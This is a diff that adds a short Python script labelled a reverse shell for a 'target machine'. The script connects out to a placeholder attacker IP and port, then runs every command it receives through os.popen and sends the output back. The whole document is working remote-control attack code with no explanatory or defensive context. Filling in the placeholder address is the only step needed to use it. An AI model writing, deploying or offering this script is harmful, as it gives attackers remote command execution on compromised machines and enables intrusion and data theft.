@@ -1,0 +1,31 @@
+# Reverse Shell Hoster (target machine)
+import socket
+import os
+import sys
+
+# Set the attacker's IP and port
+attacker_ip = 'your_attacker_ip'
+attacker_port = your_attacker_port
+
+def start_reverse_shell():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s.connect((attacker_ip, attacker_port))
+    except Exception as e:
+        print("Connection failed:", e)
+        sys.exit()
+
+    while True:
+        command = s.recv(1024).decode('utf-8')
+        if 'exit' in command:
+            s.close()
+            break
+        else:
+            try:
+                output = os.popen(command).read()
+                s.send(output.encode('utf-8'))
+            except Exception as e:
+                s.send(str(e).encode('utf-8'))
+
+if __name__ == '__main__':
+    start_reverse_shell()
